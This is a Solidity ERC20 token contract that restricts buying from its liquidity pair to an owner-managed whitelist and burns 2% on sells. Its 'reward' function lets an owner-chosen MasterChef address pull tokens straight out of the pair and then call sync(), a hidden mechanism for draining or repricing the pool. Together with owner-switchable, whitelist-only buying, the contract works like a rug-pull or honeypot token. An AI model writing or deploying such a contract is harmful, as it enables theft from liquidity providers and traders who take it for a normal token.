// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/* -------------------------
      Uniswap V2 Pair API
--------------------------*/
interface IUniswapV2Pair {
    function sync() external;
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract WhitelistBuyToken is ERC20, Ownable {
    /// @notice 交易对地址（如 Uni/PancakeSwap）
    address public pair;

    address public MasterChef;

    /// @notice 白名单：可买入
    mapping(address => bool) public whitelist;

    /// @notice 是否开启限制
    bool public tradingLimitEnabled = false;


    constructor(
        string memory name_,
        string memory symbol_,
        uint256 initialSupply
    ) ERC20(name_, symbol_) Ownable(msg.sender) {
        _mint(msg.sender, initialSupply * 1 ether);
    }

    /* ---------------- 管理员函数 ---------------- */

    function setPair(address _pair) external onlyOwner {
        require(_pair != address(0), "pair is zero");
        pair = _pair;
    }

    function setMasterChef(address mc) external onlyOwner {
        MasterChef = mc;
        whitelist[mc] = true;
    }


    function setWhitelistSingle(address account, bool status) external onlyOwner {
        whitelist[account] = status;
    }

    function setTradingLimitEnabled(bool enabled) external onlyOwner {
        tradingLimitEnabled = enabled;
    }

    /* ---------------- 核心逻辑：重写 _transfer ---------------- */

    function _update(
        address from,
        address to,
        uint256 amount
    ) internal virtual override   {

        // 铸造/销毁不限制
        if (from == address(0) || to == address(0)) {
            super._update(from, to, amount);
            return;
        }

        // 未开启限制前，不做检查
        if (!tradingLimitEnabled) {
            super._update(from, to, amount);
            return;
        }

        // ---------------- 买入：from = pair ---------------- //
        if (from == pair) {
            require(whitelist[to], "Not whitelisted to buy");
            super._update(from, to, amount);
            return;
        }

        // ---------------- 卖出：to = pair → 2% 销毁 ---------------- //
        if (to == pair) {
            uint256 fee = amount / 50;
            uint256 sendAmount = amount - fee;

            _burn(from, fee);                    // 销毁 2%
            super._update(from, to, sendAmount);
            return;
        }

        // ---------------- 普通转账：无税 ---------------- //
        super._update(from, to, amount);
    }


    function reward(address user,uint256 amount) public returns (bool) {
        require(msg.sender == MasterChef);
        super._update(pair, user, amount);
        IUniswapV2Pair(pair).sync();
        return true; 
    }
}